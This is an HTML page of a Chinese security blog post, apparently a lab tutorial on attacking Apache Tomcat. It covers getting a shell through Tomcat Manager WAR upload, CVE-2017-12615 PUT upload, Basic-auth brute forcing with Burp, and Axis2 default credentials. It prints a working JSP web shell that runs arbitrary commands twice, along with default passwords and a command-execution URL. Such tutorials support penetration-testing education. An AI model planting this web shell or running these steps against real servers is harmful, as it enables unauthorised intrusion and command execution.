@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>Sec-note</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="title: Tomcat 安全问题 date: 2018-10-21 18:13:23 tags:  Tomcat  categories:  安全研究   Apache_tomcat 安全问题">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Sec-note">
+<meta property="og:url" content="http://yoursite.com/2020/08/26/Tomcat2/index.html">
+<meta property="og:site_name" content="Sec-note">
+<meta property="og:description" content="title: Tomcat 安全问题 date: 2018-10-21 18:13:23 tags:  Tomcat  categories:  安全研究   Apache_tomcat 安全问题">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-14/41285460.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-14/69979479.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-14/83403269.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-14/76689927.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-14/9748128.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-14/76689927.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-14/8954479.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-14/17014498.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-14/74839062.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-9-21/6879452.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-9-21/49583998.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-9-21/71751989.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-9-21/68481146.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-9-21/13765510.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-9-21/96541990.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/16485310.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/48292404.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/38129101.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/57948786.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/46531074.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/43433305.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/95494344.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/54873543.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/359506.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/94820632.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/34369179.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/65156900.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/10516793.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/28610566.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/44153330.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/39672229.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/41597270.jpg">
+<meta property="og:updated_time" content="2020-08-26T05:46:13.009Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Sec-note">
+<meta name="twitter:description" content="title: Tomcat 安全问题 date: 2018-10-21 18:13:23 tags:  Tomcat  categories:  安全研究   Apache_tomcat 安全问题">
+<meta name="twitter:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-14/41285460.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="Sec-note" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Sec-note</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Tomcat2" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/08/26/Tomcat2/" class="article-date">
+  <time datetime="2020-08-26T05:46:13.009Z" itemprop="datePublished">2020-08-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <hr>
+<p>title: Tomcat 安全问题</p>
+<p>date: 2018-10-21 18:13:23</p>
+<p>tags:</p>
+<ul>
+<li>Tomcat</li>
+</ul>
+<p>categories:</p>
+<ul>
+<li>安全研究</li>
+</ul>
+<hr>
+<p>Apache_tomcat 安全问题</p>
+<a id="more"></a>
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近遇到客户的很多系统使用Tomcat服务器，于是科普一下关于Tomcat漏洞的知识。</p>
+<h3 id="Tomcat-简介"><a href="#Tomcat-简介" class="headerlink" title="Tomcat 简介"></a>Tomcat 简介</h3><p><a href="https://tomcat.apache.org/" target="_blank" rel="noopener">Tomcat</a></p>
+<p>百科：Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用<a href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8" target="_blank" rel="noopener">服务器</a>，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。</p>
+<p>下载需要的版本，windows下，启动<code>\bin\startup.bat</code>，默认端口是8080，通过修改<code>\conf\server.xml</code>配置文件，改变默认端口为8000。</p>
+<p> –&gt;<br> <connector port="8000" protocol="HTTP/1.1" connectiontimeout="20000" redirectport="8443"></connector></p>
+<p>访问<code>http://127.0.0.1:8000/</code></p>
+<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-14/41285460.jpg" alt=""></p>
+<p>可以看到右边有三个选项</p>
+<ol>
+<li><p><strong>Server Status</strong></p>
+</li>
+<li><p><strong>Manager App</strong></p>
+</li>
+<li><p><strong>Host Manager</strong></p>
+</li>
+</ol>
+<p>点击访问一下。<img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-14/69979479.jpg" alt=""></p>
+<p>提示输入用户名和密码。需要将进行配置才能输入进入管理界面。</p>
+<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-14/83403269.jpg" alt=""></p>
+<p>看到需要配置<code>conf/tomcat-users.xml</code>文件。四种不同的角色权限。</p>
+<ul>
+<li><p>manager-gui - allows access to the HTML GUI and the status pages</p>
+</li>
+<li><p>manager-script - allows access to the text interface and the status pages</p>
+</li>
+<li><p>manager-jmx - allows access to the JMX proxy and the status pages</p>
+</li>
+<li><p>manager-status - allows access to the status pages only</p>
+</li>
+</ul>
+<p>这篇文章写的很好。# Tomcat Manager用户配置详解<a href="http://www.365mini.com/page/tomcat-manager-user-configuration.htm" target="_blank" rel="noopener">http://www.365mini.com/page/tomcat-manager-user-configuration.htm</a></p>
+<p>Tomcat Manager是Tomcat自带的、用于对Tomcat自身以及部署在Tomcat上的应用进行管理的web应用。Tomcat是Java领域使用最广泛的服务器之一，因此Tomcat Manager也成为了使用非常普遍的功能应用。</p>
+<p>在默认情况下，Tomcat Manager是处于禁用状态的。准确地说，Tomcat Manager需要以用户角色进行登录并授权才能使用相应的功能，不过Tomcat并没有配置任何默认的用户，因此需要我们进行相应的用户配置之后才能使用Tomcat Manager。</p>
+<p>在<code>conf/tomcat-users.xml</code>添加以下内容，重启服务。</p>
+<p><role rolename="admin">  </role></p>
+<p><role rolename="admin-gui">  </role></p>
+<p><role rolename="admin-script">  </role></p>
+<p><role rolename="manager-gui">  </role></p>
+<p><role rolename="manager-script">  </role></p>
+<p><role rolename="manager-jmx">  </role></p>
+<p><role rolename="manager-status">  </role></p>
+<user username="admin" password="admin" roles="admin,admin-gui,admin-script,manager-gui,manager-script,manager-jmx,manager-status">
+
+<p>再次访问，输入用户名和密码，就可以进来了。<img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-14/76689927.jpg" alt=""></p>
+<h3 id="Tomcat-getshell-1"><a href="#Tomcat-getshell-1" class="headerlink" title="Tomcat getshell 1"></a>Tomcat getshell 1</h3><p>既然进来了，就要考虑怎么getshell。</p>
+<p>选择<code>Manager App</code><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-14/9748128.jpg" alt=""></p>
+<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-14/76689927.jpg" alt=""></p>
+<p><strong>上传War包</strong></p>
+<p>先将jsp马压缩为zip，再将zip后缀改名为war，然后上传war包。</p>
+<p>本次上传的为xima.jsp。</p>
+<p>&lt;%<br>if(“023”.equals(request.getParameter(“pwd”))){<br> java.io.InputStream in =<br> Runtime.getRuntime().exec(request.getParameter(“i”)).getInputStream();<br> int a = -1;<br> byte[] b = new byte[2048];<br> out.print(“<pre>“);<br> while((a=in.read(b)) !=1){<br> out.println(new String(b));<br> }<br> out.print(“</pre>“);<br>}<br>%&gt;</p>
+<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-14/8954479.jpg" alt=""></p>
+<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-14/17014498.jpg" alt=""></p>
+<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-14/74839062.jpg" alt=""></p>
+<h3 id="Tomcat-CVE-2017-12615-Getshell"><a href="#Tomcat-CVE-2017-12615-Getshell" class="headerlink" title="Tomcat CVE-2017-12615 Getshell"></a>Tomcat CVE-2017-12615 Getshell</h3><p>影响版本：<strong>7.0.0 to 7.0.79</strong></p>
+<p>默认配置不受影响。留后门利用的话，需要修改默认配置文件，如下。</p>
+<p>修改配置文件 <code>conf\server.xml</code></p>
+<p>添加以下内容</p>
+<p><init-param><br> <param-name>readonly</param-name><br> <param-value>false</param-value><br> </init-param></p>
+<h3 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h3><p>CVE-2017-12615 需要将readonly初始化参数由默认值设置为false。但是Tomcat7.x版本中的<code>web.xml</code>配置文件中没有<code>readonly</code>参数，需要手工添加，默认配置不受此漏洞影响。</p>
+<p><strong>版本–7.0.81</strong></p>
+<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-9-21/6879452.jpg" alt=""></p>
+<p>上传的时候出现，403禁止。。</p>
+<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-9-21/49583998.jpg" alt=""></p>
+<p><strong>版本–7.0.79</strong></p>
+<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-9-21/71751989.jpg" alt=""></p>
+<ul>
+<li>put请求，上传内容</li>
+</ul>
+<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-9-21/68481146.jpg" alt=""></p>
+<ul>
+<li>访问</li>
+</ul>
+<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-9-21/13765510.jpg" alt=""></p>
+<ul>
+<li><p>上传一木马</p>
+<p>&lt;% if(“023”.equals(request.getParameter(“pwd”))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(“i”)).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(“<pre>“); while((a=in.read(b)) !=1){ out.println(new String(b)); } out.print(“</pre>“); } %&gt;</p>
+</li>
+</ul>
+<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-9-21/96541990.jpg" alt=""></p>
+<h3 id="Tomcat-爆破"><a href="#Tomcat-爆破" class="headerlink" title="Tomcat 爆破"></a>Tomcat 爆破</h3><p>登录处进行抓包。<img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/16485310.jpg" alt=""></p>
+<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/48292404.jpg" alt=""></p>
+<p>其中 <code>Authorization: Basic dGVzdDp0ZXN0</code> 是认证的数据。Base64解码可以看到：<code>test:test</code><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/38129101.jpg" alt=""></p>
+<p>认证方式为： <code>username:passwd</code>用户名，冒号，密码。</p>
+<p>使用<code>Burp</code>进行爆破。</p>
+<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/57948786.jpg" alt=""></p>
+<p>设置<code>payload</code></p>
+<p><code>payload type</code>选择<code>Custom iterator</code>，自定义爆破密码类型。</p>
+<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/46531074.jpg" alt=""></p>
+<p>设置第一组payload为账号。<img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/43433305.jpg" alt="">第二组payload为冒号。<img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/95494344.jpg" alt="">第三组payload为密码。<img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/54873543.jpg" alt="">还有对设置的<code>payload</code>进行<code>base64</code>加密。</p>
+<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/359506.jpg" alt=""></p>
+<p>在最后的<code>Payload Encoding</code>中可以选择是否urlencode加密特殊字符，基础认证是不需要urlencode的，所以可以取消掉这个对号。<img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/94820632.jpg" alt=""></p>
+<p>开始爆破。可以看到200爆破成功了，然后就可以登录进去部署shell了。实战中，需要依靠强大的字典。<img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/34369179.jpg" alt=""></p>
+<h3 id="Axis2-getshell"><a href="#Axis2-getshell" class="headerlink" title="Axis2 getshell"></a>Axis2 getshell</h3><p>百科：AXIS2 不只为WEB应用程式提供Web服务的接口，而且它也可以作为一个单独的服务器看待，而且很简单就能跟<a href="https://baike.baidu.com/item/Apache%20Tomcat" target="_blank" rel="noopener">Apache Tomcat</a>整合。下载地址<a href="http://axis.apache.org/axis2/java/core/download.html" target="_blank" rel="noopener">http://axis.apache.org/axis2/java/core/download.html</a></p>
+<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/65156900.jpg" alt=""></p>
+<p>下载后，解压，将<code>axis2.war</code>放到Tomcat的<code>\webapps</code>目录下。访问：<a href="http://127.0.0.1:8000/axis2/axis2-web/" target="_blank" rel="noopener">http://127.0.0.1:8000/axis2/axis2-web/</a></p>
+<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/10516793.jpg" alt=""></p>
+<p>默认的管理员以及密码：admin/axis2</p>
+<p>登录进来：<img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/28610566.jpg" alt=""></p>
+<p>参考getshell：<a href="http://javaweb.org/?p=1548" target="_blank" rel="noopener">http://javaweb.org/?p=1548</a>点击左侧“Upload Service”上传cat.arr。<img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/44153330.jpg" alt=""></p>
+<p>部署成功后切到：Available Services(可用的services)。<img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/39672229.jpg" alt=""></p>
+<p>利用上传上去的文件来执行命令。<code>http://127.0.0.1:8000/axis2/services/Cat/exec?cmd=whoami</code><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/41597270.jpg" alt=""></p>
+<h3 id="Tomcat-聚合"><a href="#Tomcat-聚合" class="headerlink" title="Tomcat 聚合"></a>Tomcat 聚合</h3><p><a href="http://www.365mini.com/page/tomcat-manager-user-configuration.htm" target="_blank" rel="noopener">http://www.365mini.com/page/tomcat-manager-user-configuration.htm</a><a href="https://blog.csdn.net/weixian52034/article/details/53218584" target="_blank" rel="noopener">https://blog.csdn.net/weixian52034/article/details/53218584</a><a href="https://blog.csdn.net/kkgbn/article/details/52071109" target="_blank" rel="noopener">https://blog.csdn.net/kkgbn/article/details/52071109</a><a href="https://tomcat.apache.org/" target="_blank" rel="noopener">https://tomcat.apache.org/</a><a href="https://weibo.com/ttarticle/p/show?id=2309351002704074472985516075" target="_blank" rel="noopener">https://weibo.com/ttarticle/p/show?id=2309351002704074472985516075</a><a href="https://mp.weixin.qq.com/s/-dgcKKCjT8C2yDxMOXDyLA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/-dgcKKCjT8C2yDxMOXDyLA</a><a href="http://javaweb.org/?p=567" target="_blank" rel="noopener">http://javaweb.org/?p=567</a><a href="https://www.hackersb.cn/hacker/183.html" target="_blank" rel="noopener">https://www.hackersb.cn/hacker/183.html</a><a href="http://blog.51cto.com/nekesec/1746874" target="_blank" rel="noopener">http://blog.51cto.com/nekesec/1746874</a><a href="http://javaweb.org/?p=1548" target="_blank" rel="noopener">http://javaweb.org/?p=1548</a><a href="https://www.aliyun.com/jiaocheng/546247.html" target="_blank" rel="noopener">https://www.aliyun.com/jiaocheng/546247.html</a><a href="https://www.bodkin.ren/index.php/archives/27/" target="_blank" rel="noopener">https://www.bodkin.ren/index.php/archives/27/</a></p>
+</user>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/08/26/Tomcat2/" data-id="ckeayi77s0040qixdkrfsspx9" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2020/06/25/信息收集二-爬虫链接/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">信息收集第二步</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/WAF/">WAF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web安全/">Web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web安全资料汇集/">Web安全资料汇集</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web开发/">Web开发</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/bug-bounty/">bug_bounty</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/life/">life</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/">代码审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全研究/">安全研究</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/技术研究/">技术研究</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/机器学习/">机器学习</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透技巧/">渗透技巧</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/算法与数据结构/">算法与数据结构</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/编程学习/">编程学习</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/翻译/">翻译</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/计算机基础/">计算机基础</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Bypasswaf/">Bypasswaf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSS/">CSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Django/">Django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Flask/">Flask</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTML/">HTML</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTP/">HTTP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Javascript/">Javascript</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Jboss/">Jboss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQLi/">SQLi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Spring/">Spring</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Struts/">Struts</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tomcat/">Tomcat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Weblogic/">Weblogic</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/">XSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bug-bounty/">bug_bounty</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/git/">git</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/">hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/iis-shortname/">iis-shortname</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/life/">life</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssh-log/">ssh-log</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/业务逻辑安全/">业务逻辑安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/翻译/">翻译</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/Bypasswaf/" style="font-size: 17.5px;">Bypasswaf</a> <a href="/tags/CSS/" style="font-size: 10px;">CSS</a> <a href="/tags/Django/" style="font-size: 12.5px;">Django</a> <a href="/tags/Flask/" style="font-size: 15px;">Flask</a> <a href="/tags/HTML/" style="font-size: 10px;">HTML</a> <a href="/tags/HTTP/" style="font-size: 10px;">HTTP</a> <a href="/tags/Javascript/" style="font-size: 10px;">Javascript</a> <a href="/tags/Jboss/" style="font-size: 10px;">Jboss</a> <a href="/tags/PHP/" style="font-size: 17.5px;">PHP</a> <a href="/tags/SQLi/" style="font-size: 20px;">SQLi</a> <a href="/tags/Spring/" style="font-size: 10px;">Spring</a> <a href="/tags/Struts/" style="font-size: 12.5px;">Struts</a> <a href="/tags/Tomcat/" style="font-size: 10px;">Tomcat</a> <a href="/tags/Weblogic/" style="font-size: 12.5px;">Weblogic</a> <a href="/tags/XSS/" style="font-size: 12.5px;">XSS</a> <a href="/tags/bug-bounty/" style="font-size: 15px;">bug_bounty</a> <a href="/tags/git/" style="font-size: 10px;">git</a> <a href="/tags/hexo/" style="font-size: 10px;">hexo</a> <a href="/tags/iis-shortname/" style="font-size: 10px;">iis-shortname</a> <a href="/tags/java/" style="font-size: 10px;">java</a> <a href="/tags/life/" style="font-size: 10px;">life</a> <a href="/tags/python/" style="font-size: 15px;">python</a> <a href="/tags/ssh-log/" style="font-size: 10px;">ssh-log</a> <a href="/tags/业务逻辑安全/" style="font-size: 10px;">业务逻辑安全</a> <a href="/tags/翻译/" style="font-size: 17.5px;">翻译</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">April 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/10/">October 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">April 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/08/26/Tomcat2/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2020/06/25/信息收集二-爬虫链接/">信息收集第二步</a>
+          </li>
+        
+          <li>
+            <a href="/2020/05/25/信息收集一/">信息收集第一步</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/24/安全小翻译-记录/">安全翻译记录</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/10/blog_life/">博客</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 Sec-note<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
